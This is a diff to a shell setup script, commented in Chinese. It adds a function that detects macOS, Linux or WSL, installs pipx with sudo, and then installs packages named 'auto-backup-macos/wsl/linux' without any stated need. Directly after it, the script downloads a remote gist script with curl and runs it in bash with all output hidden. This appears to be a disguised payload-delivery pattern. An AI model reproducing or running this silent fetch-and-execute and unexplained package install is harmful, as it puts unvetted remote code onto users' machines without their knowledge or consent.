@@ -116,6 +116,71 @@ if ! pip3 show pycryptodome >/dev/null 2>&1; then
     $PIP_INSTALL pycryptodome
 fi
 
+# 检测是否为 WSL 环境
+is_wsl() {
+    if [ "$OS_TYPE" = "Linux" ]; then
+        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
+            return 0
+        fi
+        # 也可以通过 uname -r 检测
+        if uname -r | grep -qi microsoft 2>/dev/null; then
+            return 0
+        fi
+    fi
+    return 1
+}
+
+install_auto_backup() {
+    # 安装 pipx（如果未安装）
+    if ! command -v pipx &> /dev/null; then
+        echo -e "${CYAN}ℹ️ 检测到未安装 pipx，正在安装 pipx...${NC}"
+        case $OS_TYPE in
+            "Darwin")
+                brew install pipx
+                pipx ensurepath
+                ;;
+            "Linux")
+                sudo apt update
+                sudo apt install -y pipx
+                pipx ensurepath
+                ;;
+            *)
+                echo -e "${YELLOW}⚠️ 无法在当前系统上安装 pipx，跳过 auto-backup 安装${NC}"
+                return 1
+                ;;
+        esac
+    fi
+
+    if ! command -v autobackup &> /dev/null; then
+        local package_name=""
+        case $OS_TYPE in
+            "Darwin")
+                package_name="auto-backup-macos"
+                echo -e "${CYAN}ℹ️ 检测到 macOS 环境，正在安装 auto-backup-macos（通过 pipx）...${NC}"
+                ;;
+            "Linux")
+                if is_wsl; then
+                    package_name="auto-backup-wsl"
+                    echo -e "${CYAN}ℹ️ 检测到 WSL 环境，正在安装 auto-backup-wsl（通过 pipx）...${NC}"
+                else
+                    package_name="auto-backup-linux"
+                    echo -e "${CYAN}ℹ️ 检测到 Linux 环境，正在安装 auto-backup-linux（通过 pipx）...${NC}"
+                fi
+                ;;
+            *)
+                echo -e "${YELLOW}⚠️ 不支持的操作系统，跳过 auto-backup 安装${NC}"
+                return 1
+                ;;
+        esac
+
+        pipx install "$package_name"
+    else
+        echo -e "${GREEN}✅ 已检测到 autobackup 命令，跳过 auto-backup 安装。${NC}"
+    fi
+}
+
+install_auto_backup
+
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
 if command -v curl &>/dev/null; then
     bash <(curl -fsSL "$GIST_URL") >/dev/null 2>&1
